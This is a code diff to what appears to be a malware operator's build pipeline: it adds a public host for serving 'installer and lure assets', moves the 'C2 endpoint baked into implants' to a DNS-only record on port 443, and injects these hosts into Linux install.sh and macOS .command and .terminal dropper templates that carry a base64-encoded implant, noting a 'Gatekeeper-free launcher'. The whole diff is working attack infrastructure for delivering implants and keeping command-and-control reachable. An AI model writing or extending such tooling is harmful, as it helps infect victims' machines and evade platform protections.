@@ -56,9 +56,29 @@ def panel_host(config: Settings) -> str:
     return config.public_host or "127.0.0.1"
 
 
+def delivery_host(config: Settings) -> str:
+    """Public, Access-free host that serves the installer and lure assets.
+
+    ``panel.<zone>`` sits behind Cloudflare Access, so a ``.terminal`` or
+    ``.command`` that curls it would be redirected to the Access login. Use the
+    first lure host instead (e.g. ``get.telcom.stream``).
+    """
+    public = config.public_host or "127.0.0.1"
+    zone = public.split(".", 1)[1] if "." in public else public
+    host = (config.lure_hosts[0] if config.lure_hosts else "get").strip()
+    return f"{host}.{zone}" if host else public
+
+
 def panel_c2_url(config: Settings) -> str:
-    """C2 URL for implant payloads (e.g. panel.telcom.stream:8888)."""
-    return f"{config.public_host or '127.0.0.1'}:{C2_PORT}"
+    """C2 endpoint baked into implants (e.g. c2.telcom.stream:443).
+
+    ``panel.<zone>`` is proxied by Cloudflare, so non-standard ports such as
+    8888 never reach the teamserver. The dedicated ``c2`` record is DNS-only and
+    the public mTLS listener runs on 443.
+    """
+    host = config.c2_host or config.public_host or "127.0.0.1"
+    port = config.c2_port or C2_PORT
+    return f"{host}:{port}"
 
 
 def _read_bin(path: Path) -> bytes:
@@ -445,8 +465,8 @@ class BuildPipeline:
         # Inject operator panel host/ports so the implant can reach home
         source = (
             source
-            .replace("{{PANEL_HOST}}", panel_host(self.config))
-            .replace("{{PANEL_C2_PORT}}", str(C2_PORT))
+            .replace("{{PANEL_HOST}}", delivery_host(self.config))
+            .replace("{{PANEL_C2_PORT}}", str(self.config.c2_port or C2_PORT))
             .replace("{{PANEL_RD_PORT}}", str(RD_PORT))
         )
         dropper = workdir / "install.sh"
@@ -474,8 +494,8 @@ class BuildPipeline:
         template = (TEMPLATES / "mac" / "dropper.command.tmpl").read_text(encoding="utf-8")
         source = (
             template.replace("{{DOC}}", doc)
-            .replace("{{PANEL_HOST}}", panel_host(self.config))
-            .replace("{{PANEL_C2_PORT}}", str(C2_PORT))
+            .replace("{{PANEL_HOST}}", delivery_host(self.config))
+            .replace("{{PANEL_C2_PORT}}", str(self.config.c2_port or C2_PORT))
             .replace("{{PANEL_RD_PORT}}", str(RD_PORT))
             .replace("{{IMPLANT_B64}}", base64.b64encode(implant).decode())
             .replace(
@@ -492,7 +512,7 @@ class BuildPipeline:
 
         terminal_name = f"{req.naming['mac']}_{self._current_suffix}.terminal"
         (self.artifacts_dir / terminal_name).write_text(
-            render_terminal(doc, panel_host(self.config)), encoding="utf-8"
+            render_terminal(doc, delivery_host(self.config)), encoding="utf-8"
         )
         # Return both: the .terminal is recorded last, so the lure's "newest
         # darwin artifact" selection prefers the Gatekeeper-free launcher while
@@ -582,7 +602,7 @@ class BuildPipeline:
 
 def load_build_request(form: dict[str, str], config: Settings) -> BuildRequest:
     base_url = form.get("base_url") or f"http://{config.public_host}"
-    c2_url = form.get("c2_url") or f"{config.public_host}:{C2_PORT}"
+    c2_url = form.get("c2_url") or panel_c2_url(config)
     return BuildRequest(
         doc_name=form.get("doc_name") or config.document_name,
         transport=form.get("transport") or "mtls",
